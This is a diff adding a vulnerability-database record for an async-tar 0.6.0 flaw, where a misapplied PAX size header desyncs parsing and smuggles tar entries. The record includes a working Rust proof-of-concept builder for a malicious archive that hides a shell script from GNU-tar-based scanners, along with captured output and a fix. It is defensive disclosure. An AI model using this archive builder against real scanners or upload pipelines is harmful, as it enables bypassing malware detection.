@@ -1,0 +1,429 @@
+[id]
+ave_id = "AVE-2026-0417"
+aliases = ["CVE-2026-53600","GHSA-35rm-7j9c-2f7m"]
+
+[basic]
+title = "async-tar PAX extension-header desync enables tar entry/content smuggling"
+description = "## Summary
+
+`async-tar` v0.6.0 mis-applies a buffered PAX `size` extension to an intermediary
+extension header (a GNU longname `L`, a GNU longlink `K`, or a PAX `x`/`g`
+header) instead of to the next *file* entry. POSIX requires a PAX extended-header
+record set to describe the next file entry, never an intervening extension
+header. Because `poll_next_raw` (`src/archive.rs`) threads the buffered PAX
+records into the size computation of whatever raw header it reads next — and that
+header can be an intermediary `L` — the stream cursor is advanced by an
+attacker-chosen amount when the `L` body is consumed. The parser then desyncs
+relative to a POSIX-correct tar parser (e.g. GNU tar), reading subsequent bytes
+at the wrong block boundary.
+
+An attacker who can influence a tar stream that an `async-tar` consumer extracts
+can construct an `x → L → file` sequence whose entry list and on-disk result
+differ between `async-tar` and a reference parser. This enables content/entry
+smuggling: a file that a GNU-tar-based scanner/validator/AV sees as benign opaque
+data is extracted by `async-tar` as a different file with different bytes (e.g. an
+executable script), and vice versa.
+
+Type confusion / improper validation of the specified quantity (size). CWE-20,
+CWE-843. Severity assessed Medium, consistent with the same defect class in the
+upstream tar-rs / tokio-tar lineage.
+
+## Affected code
+
+Package: `async-tar` (crates.io). Affected version: **0.6.0** (latest release) and
+current `main` HEAD. Both lack the extension-header guard.
+
+`src/archive.rs`, `poll_next_raw` (line numbers from the v0.6.0 tag,
+commit `45814b19295b7398e119c90c57d8c8bf70a798b6`):
+
+```rust
+    let file_pos = *next;
+
+    let mut header = current_header.take().unwrap();
+
+    // when pax extensions are available, the size should come from there.
+    let mut size = header.entry_size()?;
+
+    // the size above will be overriden by the pax data if it has a size field.
+    // same for uid and gid, which will be overridden in the header itself.
+    if let Some(pax_extensions_data) = pax_extensions_data {   // <-- no is_extension_header guard
+        let pax = pax_extensions(pax_extensions_data);
+        for extension in pax {
+            let extension = extension.map_err(|_e| other(\"pax extensions invalid\"))?;
+            let Some(key) = extension.key().ok() else { continue };
+            match key {
+                \"size\" => {
+                    let size_str = extension.value()
+                        .map_err(|_e| other(\"failed to parse pax size as string\"))?;
+                    size = size_str.parse::<u64>()
+                        .map_err(|_e| other(\"failed to parse pax size\"))?;
+                }
+                \"uid\" => { let v = extension.value().unwrap(); header.set_uid(v.parse().unwrap()); }
+                \"gid\" => { let v = extension.value().unwrap(); header.set_gid(v.parse().unwrap()); }
+                _ => { continue }
+            }
+        }
+    }
+
+    let data = EntryIo::Data(archive.clone().take(size));   // body length = mis-applied PAX size
+```
+
+and a few lines further down the same function:
+
+```rust
+    // Store where the next entry is, rounding up by 512 bytes.
+    let size = (size + 511) & !(512 - 1);
+    *next += size;                                          // cursor advance = mis-applied PAX size
+```
+
+The caller loop in `src/archive.rs` (`Entries::poll_next`) buffers a PAX local
+extension into `current_pax_extensions` and then calls `poll_next_raw` with
+`current_pax_extensions.as_deref()` for the *next* raw header. When that next
+raw header is an intermediary GNU longname (handled by the `is_gnu_longname()`
+branch a few lines later), the PAX `size` is applied to it, so `*next` advances by
+the spoofed size rather than the `L` header's own declared size. That is the
+desync.
+
+The buffered PAX records are intended to apply only to the following *file*
+entry; the missing check is whether the raw header currently being sized is itself
+an extension header (`L`/`K`/`x`/`g`).
+
+## Impact
+
+Differential extraction / entry smuggling. A consumer that extracts an
+attacker-influenced tar stream with `async-tar` (e.g. a server endpoint that
+unpacks an uploaded `.tar`/`.tar.gz`, a dependency/artifact fetcher that unpacks
+a remote tarball, an archive-preview/scan pipeline) will:
+
+- materialize files / file contents that a POSIX-correct parser (GNU tar,
+  libarchive/bsdtar) does not surface, and
+- omit or alter files that the reference parser does surface.
+
+This breaks any security control that relies on scanning the archive with one
+parser and extracting with `async-tar`: a malware/secret scanner reading the
+stream with GNU tar can be made to see only benign data while `async-tar` writes
+an executable payload to disk. It can also be used to hide entries from
+audit/inventory tooling, or to write content to a path the reviewer believes
+holds something else. No attacker-controlled local state is required — only the
+ability to influence the bytes of the tar stream that the consumer extracts.
+
+## How input reaches the sink (reachability)
+
+The vulnerable path is the library's primary public API for reading archives:
+`Archive::new(reader).entries()` returns an `Entries` stream whose `poll_next`
+drives `poll_next_raw` for every header. Any consumer that iterates entries (or
+calls `unpack`/`unpack_in` on them) of an attacker-influenced tar stream reaches
+the sink with no additional configuration. The `reader` need not be a file — it is
+any `AsyncRead`, so an upload buffer, an HTTP response body, or a decompressor
+output all qualify. The only precondition for the desync is that the stream
+contain a PAX local-extension header (`x`) carrying a `size` record immediately
+followed by an intermediary GNU longname (`L`) before the next file header — a
+structure the attacker fully controls in the archive bytes. Representative
+reachable consumers are server endpoints that unpack uploaded `.tar`/`.tar.gz`
+bodies, dependency/artifact fetchers that unpack remote tarballs, and
+archive-scan/preview pipelines.
+
+## Proof of concept
+
+A standalone Rust consumer binary that links the published crates.io
+`async-tar = \"=0.6.0\"` (`default-features = false, features = [\"runtime-tokio\"]`)
+and runs the real `Archive::new(...).entries()` extraction loop (the same shape
+used by real downstream server consumers that unpack uploaded tarballs). It reads
+a tar file and writes each entry to a destination directory, printing the entry
+list `async-tar` surfaces. A second binary hand-crafts the malicious and benign
+tar byte streams.
+
+Malicious archive geometry (block = 512 bytes):
+
+```
+B0  x  PAX local-extension header, records declare size=1024 (= 2 blocks)
+B1     PAX records  (\"<len> size=1024\n\")
+B2  L  GNU longname header, OWN declared size = 512 (= 1 block)
+B3     longname block #1  = \"GNU_SEES_THIS.txt\0...\"   (the name GNU tar uses)
+B4     a normal file header \"placeholder_A\" (size 512)
+B5     <-- this block IS a valid tar header for the smuggled file
+           \"hidden_payload.sh\" (size 65)
+B6     smuggled payload  \"#!/bin/sh\n# SMUGGLED ENTRY...\n\"
+B7,B8  two zero blocks (EOF)
+```
+
+GNU tar honours the `L` header's own declared size (1 block) for the longname and
+ignores the buffered PAX `size`, so it reads B3 as the longname, treats B4 as the
+file, and reads B5 as that file's opaque data. `async-tar` mis-applies the PAX
+`size` (2 blocks) to the `L` header, reads B3+B4 as the longname, lands its cursor
+on B5, parses it as a tar header, and extracts the smuggled `hidden_payload.sh`
+body (B6).
+
+Tar-builder source (`mktar.rs`):
+
+```rust
+use std::io::Write;
+const BLOCK: usize = 512;
+
+fn octal(buf: &mut [u8], v: u64) {
+    let s = format!(\"{:0width$o}\", v, width = buf.len() - 1);
+    let b = s.as_bytes();
+    buf[..b.len()].copy_from_slice(b);
+    buf[b.len()] = 0;
+}
+
+fn header(name: &[u8], size: u64, typeflag: u8) -> [u8; BLOCK] {
+    let mut h = [0u8; BLOCK];
+    let n = name.len().min(100);
+    h[..n].copy_from_slice(&name[..n]);
+    octal(&mut h[100..108], 0o644);
+    octal(&mut h[108..116], 0);
+    octal(&mut h[116..124], 0);
+    octal(&mut h[124..136], size);
+    octal(&mut h[136..148], 0);
+    h[156] = typeflag;
+    if typeflag == b'L' { h[257..265].copy_from_slice(b\"ustar  \0\"); }
+    else { h[257..263].copy_from_slice(b\"ustar\0\"); h[263..265].copy_from_slice(b\"00\"); }
+    for b in &mut h[148..156] { *b = b' '; }
+    let sum: u32 = h.iter().map(|b| *b as u32).sum();
+    h[148..156].copy_from_slice(format!(\"{:06o}\0 \", sum).as_bytes());
+    h
+}
+
+fn pad(out: &mut Vec<u8>, len: usize) {
+    let rem = len % BLOCK;
+    if rem != 0 { out.extend(std::iter::repeat(0u8).take(BLOCK - rem)); }
+}
+fn pax_record(key: &str, val: &str) -> Vec<u8> {
+    let mut len = key.len() + val.len() + 3;
+    loop {
+        let s = format!(\"{} {}={}\n\", len, key, val);
+        if s.len() == len { return s.into_bytes(); }
+        len = s.len();
+    }
+}
+fn name_block(name: &[u8]) -> Vec<u8> { let mut b = vec![0u8; BLOCK]; b[..name.len()].copy_from_slice(name); b }
+fn write_block(out: &mut Vec<u8>, data: &[u8]) { out.extend_from_slice(data); pad(out, data.len()); }
+
+fn build_malicious() -> Vec<u8> {
+    let mut out = Vec::new();
+    let gnu_name = b\"GNU_SEES_THIS.txt\";
+    let spoof = (BLOCK * 2) as u64;
+    let mut recs = Vec::new();
+    recs.extend(pax_record(\"size\", &spoof.to_string()));
+    out.extend_from_slice(&header(b\"./PaxHeaders/0\", recs.len() as u64, b'x'));
+    write_block(&mut out, &recs);
+    out.extend_from_slice(&header(b\"././@LongLink\", BLOCK as u64, b'L'));
+    out.extend_from_slice(&name_block(gnu_name));                 // B3
+    out.extend_from_slice(&header(b\"placeholder_A\", BLOCK as u64, b'0')); // B4
+    let smuggled_body = b\"#!/bin/sh\n# SMUGGLED ENTRY: invisible to a GNU-tar-based scanner\n\".to_vec();
+    out.extend_from_slice(&header(b\"hidden_payload.sh\", smuggled_body.len() as u64, b'0')); // B5
+    write_block(&mut out, &smuggled_body);                        // B6
+    out.extend(std::iter::repeat(0u8).take(BLOCK * 2));
+    out
+}
+
+fn build_benign() -> Vec<u8> {
+    let mut out = Vec::new();
+    let mut recs = Vec::new();
+    recs.extend(pax_record(\"path\", \"normal_file.txt\"));
+    out.extend_from_slice(&header(b\"./PaxHeaders/0\", recs.len() as u64, b'x'));
+    write_block(&mut out, &recs);
+    let body = b\"plain benign content\n\".to_vec();
+    out.extend_from_slice(&header(b\"normal_file.txt\", body.len() as u64, b'0'));
+    write_block(&mut out, &body);
+    let body2 = b\"second benign file\n\".to_vec();
+    out.extend_from_slice(&header(b\"second.txt\", body2.len() as u64, b'0'));
+    write_block(&mut out, &body2);
+    out.extend(std::iter::repeat(0u8).take(BLOCK * 2));
+    out
+}
+
+fn main() {
+    let a: Vec<String> = std::env::args().collect();
+    let bytes = match a[1].as_str() { \"malicious\" => build_malicious(), \"benign\" => build_benign(), _ => std::process::exit(2) };
+    std::fs::File::create(&a[2]).unwrap().write_all(&bytes).unwrap();
+}
+```
+
+Consumer source (`main.rs`, mirrors a real `Archive::entries()` extraction loop):
+
+```rust
+use async_tar::Archive;
+use tokio::fs;
+use tokio::io::AsyncReadExt;
+use tokio_stream::StreamExt;
+
+#[tokio::main(flavor = \"multi_thread\", worker_threads = 2)]
+async fn main() {
+    let args: Vec<String> = std::env::args().collect();
+    let dest = std::path::PathBuf::from(&args[2]);
+    fs::create_dir_all(&dest).await.unwrap();
+    let bytes = fs::read(&args[1]).await.unwrap();
+    let archive = Archive::new(std::io::Cursor::new(bytes));
+    let mut entries = archive.entries().expect(\"entries()\");
+    let mut idx = 0usize;
+    while let Some(entry) = entries.next().await {
+        let mut file = match entry { Ok(f) => f, Err(e) => { println!(\"[async-tar] ERROR: {e}\"); break } };
+        let path_raw = file.path().expect(\"path\").into_owned();
+        let path_disp = path_raw.to_string_lossy().split('\u{0}').next().unwrap_or(\"\").to_string();
+        let hdr_size = file.header().size().unwrap_or(0);
+        let mut out = dest.clone();
+        for comp in std::path::PathBuf::from(&path_disp).components() {
+            if let std::path::Component::Normal(p) = comp { out.push(p); }
+        }
+        let mut body = Vec::new();
+        let read = file.read_to_end(&mut body).await.unwrap_or(0);
+        if let Some(parent) = out.parent() { let _ = fs::create_dir_all(parent).await; }
+        let _ = fs::write(&out, &body).await;
+        let preview: String = body.iter().take(48)
+            .map(|b| if b.is_ascii_graphic() || *b == b' ' { *b as char } else { '.' }).collect();
+        println!(\"[async-tar] entry#{idx} path={:?} hdr_size={hdr_size} bytes_read={read} body=\\"{preview}\\"\", path_disp);
+        idx += 1;
+    }
+    println!(\"[async-tar] total entries surfaced: {idx}\");
+}
+```
+
+`Cargo.toml`:
+
+```toml
+[dependencies]
+async-tar = { version = \"=0.6.0\", default-features = false, features = [\"runtime-tokio\"] }
+tokio = { version = \"1\", features = [\"rt-multi-thread\", \"macros\", \"io-util\", \"fs\"] }
+tokio-stream = \"0.1\"
+futures = \"0.3\"
+```
+
+## End-to-end reproduction
+
+Reference parser: GNU tar 1.35. async-tar: the v0.6.0 crates.io release linked by
+the consumer binary above. Verbatim captured output:
+
+```
+$ cargo build --release        # links async-tar v0.6.0 from crates.io
+   Compiling async-tar v0.6.0
+   Compiling async-tar-consumer v0.1.0
+    Finished `release` profile [optimized] target(s) in 10.12s
+
+$ ./target/release/mktar malicious mal.tar
+wrote 4608 bytes to mal.tar
+
+# ---- (A) GNU tar reference: list + extract ----
+$ gtar tvf mal.tar ; echo \"rc=$?\"
+-rw-r--r-- 0/0            1024 1970-01-01 08:00 GNU_SEES_THIS.txt
+rc=0
+$ gtar xf mal.tar -C /tmp/gnu_x ; echo \"rc=$?\"
+rc=0
+$ head -c 80 /tmp/gnu_x/GNU_SEES_THIS.txt
+hidden_payload.sh
+# (GNU tar surfaces ONE file, 1024 bytes; its data is the opaque tar-header
+#  bytes of B5 — a GNU-tar-based scanner sees only benign noise.)
+
+# ---- (B) async-tar v0.6.0 consumer: extract ----
+$ ./target/release/extract mal.tar /tmp/at_mal
+[async-tar] entry#0 path=\"GNU_SEES_THIS.txt\" hdr_size=65 bytes_read=1024 body=\"#!/bin/sh.# SMUGGLED ENTRY: invisible to a GNU-t\"
+[async-tar] total entries surfaced: 1
+$ head -c 80 /tmp/at_mal/GNU_SEES_THIS.txt
+#!/bin/sh
+# SMUGGLED ENTRY: invisible to a GNU-tar-based scanner
+```
+
+Same bytes, two parsers, different on-disk result: GNU tar writes a 1024-byte
+benign blob; `async-tar` writes a 65-byte executable shell script that the
+reference parser never exposes as an entry. The smuggled `#!/bin/sh` body is
+content a GNU-tar-based scanner would never inspect.
+
+Negative control — a benign archive (correct PAX usage: `x` applies `path` to the
+following file, no intermediary `L`):
+
+```
+$ ./target/release/mktar benign ben.tar
+$ gtar tvf ben.tar ; echo \"rc=$?\"
+-rw-r--r-- 0/0              21 1970-01-01 08:00 normal_file.txt
+-rw-r--r-- 0/0              19 1970-01-01 08:00 second.txt
+rc=0
+$ ./target/release/extract ben.tar /tmp/at_ben
+[async-tar] entry#0 path=\"normal_file.txt\" hdr_size=21 bytes_read=21 body=\"plain benign content.\"
+[async-tar] entry#1 path=\"second.txt\" hdr_size=19 bytes_read=19 body=\"second benign file.\"
+[async-tar] total entries surfaced: 2
+```
+
+GNU tar and `async-tar` produce identical entry lists and identical on-disk files.
+No smuggling. The differential is exclusive to the `x → L → file` desync sequence.
+
+## Fix
+
+Apply the buffered PAX records (and the `size`/`uid`/`gid` overrides) only when
+the raw header being sized is NOT itself an extension header. Skip the override
+for GNU longname (`L`), GNU longlink (`K`), and PAX local/global (`x`/`g`) headers,
+whose body length must come from their own declared size. This mirrors the fix
+adopted in the upstream tar-rs / tokio-tar lineage for the same defect class.
+
+```rust
+    // when pax extensions are available, the size should come from there.
+    let mut size = header.entry_size()?;
+
+    // PAX extensions describe the NEXT file entry, not an intermediary
+    // extension header. Applying a buffered PAX `size` to such an intermediary
+    // header (L/K/x/g) advances the stream cursor by the wrong amount and
+    // desyncs the parse.
+    let entry_type = header.entry_type();
+    let is_extension_header = entry_type.is_gnu_longname()
+        || entry_type.is_gnu_longlink()
+        || entry_type.is_pax_local_extensions()
+        || entry_type.is_pax_global_extensions();
+
+    // the size above will be overriden by the pax data if it has a size field.
+    // same for uid and gid, which will be overridden in the header itself.
+    if let Some(pax_extensions_data) = pax_extensions_data.filter(|_| !is_extension_header) {
+        let pax = pax_extensions(pax_extensions_data);
+        for extension in pax {
+            // unchanged: same size/uid/gid override loop as before
+        }
+    }
+```
+
+Fix-verify, captured verbatim. The patched `async-tar` (guard added) re-run
+against the same `mal.tar`:
+
+```
+$ cargo build --release        # [patch.crates-io] async-tar = { path = \"../async-tar-patched\" }
+   Compiling async-tar v0.6.0 (.../async-tar-patched)
+   Compiling async-tar-consumer v0.1.0
+    Finished `release` profile [optimized] target(s)
+$ ./target/release/extract mal.tar /tmp/at_fix
+[async-tar] entry#0 path=\"GNU_SEES_THIS.txt\" hdr_size=512 bytes_read=1024 body=\"hidden_payload.sh...............................\"
+[async-tar] total entries surfaced: 1
+$ head -c 80 /tmp/at_fix/GNU_SEES_THIS.txt
+hidden_payload.sh
+```
+
+With the guard, `async-tar`'s view converges with GNU tar's: it surfaces
+`GNU_SEES_THIS.txt` with the opaque B5 bytes (`hidden_payload.sh...`) as data, and
+no longer extracts the smuggled executable script. The benign control still
+produces the correct two-file output. The desync is eliminated.
+
+## Fix PR
+
+A fix PR adding the `is_extension_header` guard to `poll_next_raw` in
+`src/archive.rs` is opened from the advisory's temporary private fork against this
+repository. It carries the diff shown in the **Fix** section above (no behavioural
+change for well-formed archives; only intermediary `L`/`K`/`x`/`g` headers stop
+inheriting a following PAX `size`).
+
+## Credit
+
+Reported by tonghuaroot."
+severity = "MEDIUM"
+score = 5
+sources = ["ghsa"]
+published = ""
+updated = ""
+remediation = "请参考官方安全公告，及时安装安全更新或升级到最新版本。"
+
+[references]
+urls = []
+
+[exploit]
+poc_urls = []
+exp_urls = []
+
+[meta]
+status = "completed"
+collected_at = "2026-07-25T02:30:38.204127384+00:00"
